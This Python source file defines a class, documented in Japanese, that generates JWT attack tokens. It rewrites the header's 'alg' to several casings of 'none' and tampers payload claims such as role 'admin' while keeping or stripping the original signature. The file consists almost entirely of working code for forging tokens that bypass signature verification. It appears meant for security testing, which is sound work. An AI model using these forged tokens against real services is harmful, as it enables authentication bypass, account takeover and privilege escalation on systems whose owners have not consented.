import json
import base64
import copy
from typing import List, Dict, Optional

class JWTTester:
    """
    JWT トークンに関する一般的な攻撃リクエスト（alg: none やペイロードの改ざん等）を生成・テストするためのクラス
    """
    
    def __init__(self):
        pass

    def _decode_part(self, part: str) -> dict:
        """Base64Url デコードして辞書に変換"""
        # Base64Urlのパディング調整
        padded = part + '=' * (-len(part) % 4)
        decoded_bytes = base64.urlsafe_b64decode(padded)
        return json.loads(decoded_bytes.decode('utf-8'))

    def _encode_part(self, data: dict) -> str:
        """辞書を Base64Url エンコード"""
        json_str = json.dumps(data, separators=(',', ':'))
        return base64.urlsafe_b64encode(json_str.encode('utf-8')).decode('utf-8').rstrip('=')

    def generate_alg_none(self, token: str) -> List[str]:
        """
        'alg' を 'none' に書き換えたパターンのトークンを生成する（大文字小文字バリエーション対応）
        
        Args:
            token: オリジナルの JWT トークン (header.payload.signature)
            
        Returns:
            List[str]: 攻撃用トークンのリスト
        """
        parts = token.split('.')
        if len(parts) != 3:
            return []

        header = self._decode_part(parts[0])
        payload_str = parts[1]

        attack_tokens = []
        variations = ['none', 'None', 'NONE', 'nOnE']
        
        for v in variations:
            mod_header = copy.deepcopy(header)
            mod_header['alg'] = v
            new_header_str = self._encode_part(mod_header)
            
            # シグネチャなし (ピリオドで終わる) と シグネチャ完全削除 の両パターンを作成
            attack_tokens.append(f"{new_header_str}.{payload_str}.")
            attack_tokens.append(f"{new_header_str}.{payload_str}")

        return attack_tokens

    def generate_modified_payload(self, token: str, modifications: Dict[str, any], keep_signature: bool = True) -> str:
        """
        ペイロード内の特定のクレームを改ざんしたトークンを生成する
        
        Args:
            token: オリジナルの JWT トークン
            modifications: {"role": "admin", "uid": 1} のような書き換え内容
            keep_signature: 真なら元のシグネチャをそのままつける（通常検証では弾かれるが、シグネチャ検証不備を突くテスト）
        """
        parts = token.split('.')
        if len(parts) != 3:
            return ""

        header_str = parts[0]
        payload = self._decode_part(parts[1])
        signature = parts[2]

        for k, v in modifications.items():
            payload[k] = v

        new_payload_str = self._encode_part(payload)
        
        if keep_signature:
            return f"{header_str}.{new_payload_str}.{signature}"
        else:
            return f"{header_str}.{new_payload_str}."

    def extract_claims(self, token: str) -> dict:
        """
        トークンからペイロード（クレーム）を抽出する
        """
        parts = token.split('.')
        if len(parts) != 3:
            return {}
        return self._decode_part(parts[1])

    def extract_header(self, token: str) -> dict:
        """
        トークンからヘッダーを抽出する
        """
        parts = token.split('.')
        if len(parts) != 3:
            return {}
        return self._decode_part(parts[0])
